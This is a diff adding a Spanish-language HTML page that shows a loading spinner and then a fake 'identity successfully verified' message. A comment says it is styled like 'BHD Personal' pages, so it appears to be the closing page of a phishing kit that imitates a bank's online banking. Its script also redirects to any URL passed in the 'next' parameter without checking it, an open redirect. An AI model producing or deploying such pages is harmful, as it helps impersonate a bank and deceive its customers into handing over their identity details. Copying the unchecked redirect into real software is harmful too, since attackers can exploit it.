@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Cargando… / Verificación Exitosa</title>
+  <style>
+    /* Variables y reset similares a tus páginas BHD Personal */
+    :root {
+      --primary-color: #4CAF50;
+      --bg-opacity: rgba(255,255,255,0.95);
+      --text-color: #333;
+    }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family: Trebuchet MS, Helvetica, sans-serif;
+      background: url('background.webp') no-repeat center center fixed;
+      background-size: cover;
+      display: flex; align-items: center; justify-content: center;
+      min-height: 100vh; color: var(--text-color); padding:20px;
+    }
+    .loader, .success-card {
+      background: var(--bg-opacity);
+      padding: 25px 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+    }
+    .spinner {
+      margin: 0 auto 1rem;
+      width: 48px; height: 48px;
+      border: 5px solid #ccc;
+      border-top-color: var(--primary-color);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loading-text {
+      font-size: 1rem;
+      color: var(--text-color);
+    }
+    .success-card {
+      display: none;
+    }
+    .success-icon {
+      font-size: 3rem;
+      color: var(--primary-color);
+      margin-bottom: 0.5rem;
+    }
+    .success-title {
+      font-size: 1.5rem;
+      font-weight: 700;
+      margin-bottom: 0.5rem;
+      color: var(--primary-color);
+    }
+    .success-msg {
+      font-size: 1rem;
+      color: var(--text-color);
+    }
+  </style>
+</head>
+<body>
+  <div class="loader">
+    <div class="spinner"></div>
+    <div class="loading-text">Cargando, por favor espera…</div>
+  </div>
+
+  <div class="success-card">
+    <div class="success-icon">✔</div>
+    <div class="success-title">Verificación Exitosa</div>
+    <div class="success-msg">¡Tu identidad ha sido verificada correctamente!</div>
+  </div>
+
+  <script>
+    // Leer parámetro next
+    const next = new URLSearchParams(window.location.search).get('next') || '';
+
+    if (next === 'success') {
+      // Mostrar spinner 5s y luego éxito
+      setTimeout(() => {
+        document.querySelector('.loader').style.display = 'none';
+        document.querySelector('.success-card').style.display = 'block';
+      }, 5000);
+    } else {
+      // Carga + redirección tras 5s
+      setTimeout(() => {
+        window.location.href = next;
+      }, 5000);
+    }
+  </script>
+</body>
+</html>
